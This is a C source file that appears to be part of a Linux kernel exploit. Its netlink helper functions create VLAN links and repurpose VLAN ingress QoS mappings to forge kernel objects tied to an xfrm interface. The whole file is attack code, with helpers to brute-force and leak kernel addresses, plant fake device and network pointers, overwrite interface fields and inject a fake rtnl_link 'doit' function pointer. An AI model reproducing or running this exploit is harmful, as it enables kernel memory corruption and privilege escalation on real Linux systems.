#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>


void create_vlan_link(struct nl_sock * socket, char *ifname, int if_link, int if_vlan_id){
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * link_info = nlmsg_alloc();
    struct nl_msg * vlan_data = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            RTM_NEWLINK,   // TYPE
            sizeof(struct ifinfomsg),
            NLM_F_REQUEST | NLM_F_CREATE 
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg));
    memset(h, 0, sizeof(struct ifinfomsg));
    nla_put_u16(vlan_data, IFLA_VLAN_ID, if_vlan_id);

    nla_put_string(link_info, IFLA_INFO_KIND, "vlan");
    nla_put_nested(link_info, IFLA_INFO_DATA, vlan_data);
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg));
    nla_put_u32(msg, IFLA_LINK, if_link);  //After debugging, we get the ifindex of xfrm link `test3`
    nla_put_nested(msg, IFLA_LINKINFO, link_info);
    nla_put_string(msg, IFLA_IFNAME, ifname);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len); 
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }
}
// We use change_vlan_link to bruceforte the address.
void change_vlan_link_for_leak(struct nl_sock * socket, char *ifname, uint64_t target_address){
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * link_info = nlmsg_alloc();
    struct nl_msg * vlan_data = nlmsg_alloc();
    struct ifla_vlan_qos_mapping * map = malloc(sizeof(struct ifla_vlan_qos_mapping));
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            RTM_NEWLINK,   // TYPE
            sizeof(struct ifinfomsg),
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg));
    memset(h, 0, sizeof(struct ifinfomsg));
    
    struct nlattr * qos_attr = nla_nest_start(vlan_data, IFLA_VLAN_INGRESS_QOS);
    //Fake device ptr
    map->from = 1;
    map->to = target_address & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 2;
    map->to = target_address >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.if_id
    map->from = 6;
    map->to = 0x10;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.collect_md
    map->from = 7;
    map->to = 1;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    nla_nest_end(vlan_data, qos_attr);
    
    nla_put_string(link_info, IFLA_INFO_KIND, "vlan");
    nla_put_nested(link_info, IFLA_INFO_DATA, vlan_data);
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg));
    //nla_put_u32(msg, IFLA_LINK, 10);  //After debugging, we get the ifindex of xfrm link `test3`
    nla_put_nested(msg, IFLA_LINKINFO, link_info);
    nla_put_string(msg, IFLA_IFNAME, ifname);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }
}

void change_vlan_link_for_fake_net(struct nl_sock * socket, char *ifname, uint64_t fake_addr1, uint64_t fake_addr2){
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * link_info = nlmsg_alloc();
    struct nl_msg * vlan_data = nlmsg_alloc();
    struct ifla_vlan_qos_mapping * map = malloc(sizeof(struct ifla_vlan_qos_mapping));
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            RTM_NEWLINK,   // TYPE
            sizeof(struct ifinfomsg),
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg));
    memset(h, 0, sizeof(struct ifinfomsg));

    struct nlattr * qos_attr = nla_nest_start(vlan_data, IFLA_VLAN_INGRESS_QOS);
    
    map->from = 1;
    map->to = fake_addr1 & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 2;
    map->to = fake_addr1 >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    
    map->from = 3;
    map->to = fake_addr2 & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 4;
    map->to = fake_addr2 >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    nla_nest_end(vlan_data, qos_attr);

    nla_put_string(link_info, IFLA_INFO_KIND, "vlan");
    nla_put_nested(link_info, IFLA_INFO_DATA, vlan_data);
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg));
    //nla_put_u32(msg, IFLA_LINK, 10);  //After debugging, we get the ifindex of xfrm link `test3`
    nla_put_nested(msg, IFLA_LINKINFO, link_info);
    nla_put_string(msg, IFLA_IFNAME, ifname);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }
}

void change_vlan_link_for_overwrite(struct nl_sock * socket, char *ifname, uint64_t fake_dev, uint64_t fake_net, uint32_t fake_p_ifid){
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * link_info = nlmsg_alloc();
    struct nl_msg * vlan_data = nlmsg_alloc();
    struct ifla_vlan_qos_mapping * map = malloc(sizeof(struct ifla_vlan_qos_mapping));
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            RTM_NEWLINK,   // TYPE
            sizeof(struct ifinfomsg),
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg));
    memset(h, 0, sizeof(struct ifinfomsg));

    struct nlattr * qos_attr = nla_nest_start(vlan_data, IFLA_VLAN_INGRESS_QOS);
    //Fake device ptr
    map->from = 1;
    map->to = fake_dev & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 2;
    map->to = fake_dev >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake net ptr
    map->from = 3;
    map->to = fake_net & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 4;
    map->to = fake_net >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.if_id
    map->from = 6;
    map->to = fake_p_ifid;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.collect_md
    map->from = 7;
    map->to = 0;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    nla_nest_end(vlan_data, qos_attr);

    nla_put_string(link_info, IFLA_INFO_KIND, "vlan");
    nla_put_nested(link_info, IFLA_INFO_DATA, vlan_data);
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg));
    //nla_put_u32(msg, IFLA_LINK, 10);  //After debugging, we get the ifindex of xfrm link `test3`
    nla_put_nested(msg, IFLA_LINKINFO, link_info);
    nla_put_string(msg, IFLA_IFNAME, ifname);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }
}

void change_vlan_link_for_fake_rtnl_link(struct nl_sock * socket, char *ifname, uint64_t fake_doit){
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * link_info = nlmsg_alloc();
    struct nl_msg * vlan_data = nlmsg_alloc();
    struct ifla_vlan_qos_mapping * map = malloc(sizeof(struct ifla_vlan_qos_mapping));
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            RTM_NEWLINK,   // TYPE
            sizeof(struct ifinfomsg),
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg));
    memset(h, 0, sizeof(struct ifinfomsg));

    struct nlattr * qos_attr = nla_nest_start(vlan_data, IFLA_VLAN_INGRESS_QOS);
    //Fake device ptr
    map->from = 1;
    map->to = fake_doit & 0xffffffff;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 2;
    map->to = fake_doit >> 32;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake net ptr
    map->from = 3;
    map->to = 0;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    map->from = 4;
    map->to = 0;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.if_id
    map->from = 5;
    map->to = 0;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    //Fake xi->p.collect_md
    map->from = 6;
    map->to = 0;
    nla_put(vlan_data, IFLA_VLAN_QOS_MAPPING, sizeof(struct ifla_vlan_qos_mapping), map);
    nla_nest_end(vlan_data, qos_attr);

    nla_put_string(link_info, IFLA_INFO_KIND, "vlan");
    nla_put_nested(link_info, IFLA_INFO_DATA, vlan_data);
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg));
    
    nla_put_nested(msg, IFLA_LINKINFO, link_info);
    nla_put_string(msg, IFLA_IFNAME, ifname);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }
}
